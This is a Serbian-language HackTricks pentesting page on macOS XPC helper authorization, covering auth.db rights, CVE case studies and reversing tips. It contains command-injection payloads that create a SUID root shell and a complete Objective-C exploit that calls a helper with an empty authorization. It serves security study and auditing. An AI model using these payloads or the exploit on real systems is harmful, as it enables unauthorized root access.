# macOS XPC Autorizacija

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC autorizacija

Apple takođe predlaže drugi način za autentifikaciju ako povezani proces ima **dozvole da pozove izloženu XPC metodu**.

Kada aplikacija treba da **izvršava akcije kao privilegovani korisnik**, umesto da pokreće aplikaciju kao privilegovanog korisnika obično instalira kao root HelperTool koji radi kao XPC servis i koji se može pozvati iz aplikacije da izvrši te akcije. Međutim, aplikacija koja poziva servis treba da ima dovoljnu autorizaciju.

### ShouldAcceptNewConnection uvek YES

Primer se može naći u [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). U `App/AppDelegate.m` pokušava da **poveže** sa **HelperTool**. A u `HelperTool/HelperTool.m` funkcija **`shouldAcceptNewConnection`** **ne proverava** nijedan od zahteva navedenih prethodno. Uvek će vratiti YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Za više informacija o tome kako pravilno konfigurisati ovu proveru:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Prava aplikacije

Međutim, postoji određena **authorization** kada se pozove metoda iz HelperTool-a.

Funkcija **`applicationDidFinishLaunching`** iz `App/AppDelegate.m` će kreirati prazan authorization reference nakon što se aplikacija pokrene. Ovo bi uvek trebalo da radi.\
Zatim će pokušati da **doda neka prava** tom authorization reference pozivajući `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Funkcija `setupAuthorizationRights` iz `Common/Common.m` će u autorizacionu bazu podataka `/var/db/auth.db` upisati prava aplikacije. Obratite pažnju da će dodati samo ona prava koja još nisu u bazi:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Funkcija `enumerateRightsUsingBlock` se koristi za dobijanje dozvola aplikacija, koje su definisane u `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Ovo znači da će na kraju ovog procesa permisije deklarisane unutar `commandInfo` biti sačuvane u `/var/db/auth.db`. Primećuješ da tamo možeš naći za **svaki metod** koji će **zahtevati autentifikaciju**, **naziv privilegije** i **`kCommandKeyAuthRightDefault`**. Ovo poslednje **određuje ko može dobiti ovo pravo**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Naziv</th><th width="165">Vrednost</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bilo ko</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niko</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Trenutni korisnik mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Zatraži od korisnika da se autentifikuje.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Zatraži od korisnika da se autentifikuje. Mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Navedite pravila</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Navesti dodatne komentare o pravu</td></tr></tbody></table>

### Provera prava

U `HelperTool/HelperTool.m` funkcija **`readLicenseKeyAuthorization`** proverava da li je pozivalac autorizovan da **izvrši taj metod** pozivanjem funkcije **`checkAuthorization`**. Ta funkcija će proveriti da li su **authData** poslati od strane pozivajućeg procesa u **ispravnom formatu** i zatim će proveriti **šta je potrebno da bi se dobilo pravo** za pozivanje konkretnog metoda. Ako sve prođe dobro, **vraćeni `error` će biti `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Imajte na umu da, da bi se **proverili zahtevi za dobijanje prava** za pozivanje te metode, funkcija `authorizationRightForCommand` će samo proveriti prethodno pomenuti objekat **`commandInfo`**. Zatim će pozvati **`AuthorizationCopyRights`** da proveri **da li poseduje pravo** da pozove funkciju (imajte u vidu da zastavice dozvoljavaju interakciju sa korisnikom).

U ovom slučaju, za pozivanje funkcije `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` je definisan kao `@kAuthorizationRuleClassAllow`. Dakle, **svako može da je pozove**.

### Informacije o bazi podataka

Pomenuto je da su ove informacije sačuvane u `/var/db/auth.db`. Možete navesti sva sačuvana pravila pomoću:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Zatim možete saznati ko može pristupiti tom pravu pomoću:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permisivna prava

Možete pronaći **sve konfiguracije dozvola** [**ovde**](https://www.dssw.co.uk/reference/authorization-rights/), ali kombinacije koje neće zahtevati interakciju korisnika su:

1. **'authenticate-user': 'false'**
- Ovo je najdirektniji ključ. Ako je postavljen na `false`, označava da korisnik ne mora da pruži autentifikaciju da bi dobio ovo pravo.
- Koristi se u **kombinaciji sa jednim od dva niže navedena ili pri označavanju grupe** kojoj korisnik mora pripadati.
2. **'allow-root': 'true'**
- Ako korisnik radi kao root user (koji ima povišene dozvole), i ovaj ključ je postavljen na `true`, root user bi potencijalno mogao dobiti ovo pravo bez dodatne autentifikacije. Međutim, tipično, dostizanje root user statusa već zahteva autentifikaciju, tako da ovo nije scenario „bez autentifikacije“ za većinu korisnika.
3. **'session-owner': 'true'**
- Ako je postavljeno na `true`, vlasnik sesije (trenutno ulogovani korisnik) bi automatski dobio ovo pravo. Ovo može zaobići dodatnu autentifikaciju ako je korisnik već ulogovan.
4. **'shared': 'true'**
- Ovaj ključ ne dodeljuje prava bez autentifikacije. Umesto toga, ako je postavljen na `true`, znači da kada je pravo jednom autentifikovano, može se deliti među više procesa bez potrebe da svaki pojedinačno ponovo prolazi autentifikaciju. Ali početno dodeljivanje prava i dalje bi zahtevalo autentifikaciju, osim ako nije kombinovano sa drugim ključevima kao što je `'authenticate-user': 'false'`.

Možete [**koristiti ovaj skript**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) da dobijete zanimljiva prava:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Studije slučaja zaobilaženja autorizacije

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Privilegovani Mach servis `com.acustica.HelperTool` prihvata svaku konekciju i njegova rutina `checkAuthorization:` poziva `AuthorizationCopyRights(NULL, …)`, pa svaki 32‑byte blob prolazi. `executeCommand:authorization:withReply:` zatim ubacuje od napadača kontrolisane stringove razdvojene zarezom u `NSTask` kao root, praveći payloads kao:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
lako kreirati SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Slušač uvek vraća YES i isti NULL `AuthorizationCopyRights` obrazac se pojavljuje u `checkAuthorization:`. Metod `exchangeAppWithReply:` konkatenira unos napadača u `system()` string dvaput, pa ubacivanje shell meta-karaktera u `appPath` (npr. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) dovodi do izvršavanja koda kao root preko Mach servisa `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Pokretanje audita kreira `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, izlaže Mach servis `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez verifikacije `AuthorizationExternalForm` pozivaoca ili potpisа koda. Jednostavan exploit `AuthorizationCreate`s prazan referent, povezuje se sa `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i poziva metodu da izvrši proizvoljne binarne fajlove kao root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 и 7.4.0–7.4.2 prihvatao je crafted XPC poruke koje su dosegle privilegovani helper bez provera autorizacije. Pošto je helper verovao sopstvenom privilegovanom `AuthorizationRef`, bilo koji lokalni korisnik koji može poslati poruku servisu mogao je naterati helper da izvrši proizvoljne promene konfiguracije ili komande kao root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Brzi saveti za trijažu

- Kada aplikacija isporučuje i GUI i helper, uporedi njihove zahteve za potpisivanje koda i proveri da li `shouldAcceptNewConnection` zaključava listener pomoću `-setCodeSigningRequirement:` (ili validira `SecCodeCopySigningInformation`). Nedostatak provera obično dovodi do scenarija CWE-863, kao u slučaju Jamf. Brzi pregled izgleda ovako:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Uporedite ono što helper *misli* da autorizuje sa onim što klijent prosledi. Pri reverziranju, postavite breakpoint na `AuthorizationCopyRights` i potvrdite da `AuthorizationRef` potiče iz `AuthorizationCreateFromExternalForm` (poslao ga klijent) umesto iz privilegovanog konteksta helper‑a; u suprotnom verovatno ste našli obrazac sličan CWE-863 iz prethodnih primera.

## Reverzno ispitivanje autorizacije

### Provera da li se koristi EvenBetterAuthorization

Ako pronađete funkciju: **`[HelperTool checkAuthorization:command:]`** verovatno proces koristi prethodno pomenuti šablon za autorizaciju:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Ako ova funkcija poziva funkcije kao što su `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, koristi [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Proverite **`/var/db/auth.db`** da vidite da li je moguće dobiti dozvole za pozivanje neke privilegovane akcije bez interakcije korisnika.

### Komunikacija protokola

Zatim treba da pronađete šemu protokola kako biste mogli uspostaviti komunikaciju sa XPC servisom.

Funkcija **`shouldAcceptNewConnection`** pokazuje koji se protokol izlaže:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

U ovom slučaju, imamo isto kao u EvenBetterAuthorizationSample, [**pogledajte ovu liniju**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Znajući naziv korišćenog protokola, moguće je dump its header definition with:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Na kraju, potrebno nam je samo **ime izloženog Mach Service-a** kako bismo uspostavili komunikaciju sa njim. Postoji nekoliko načina da se to pronađe:

- U **`[HelperTool init]`** gde možete videti da se koristi Mach Service:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- U launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

U ovom primeru je kreirano:

- Definicija protokola sa funkcijama
- Prazan auth koji se koristi za traženje pristupa
- Veza sa XPC servisom
- Poziv funkcije ako je veza bila uspešna
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Drugi XPC pomoćnici privilegija koji su zloupotrebljeni

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Reference

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
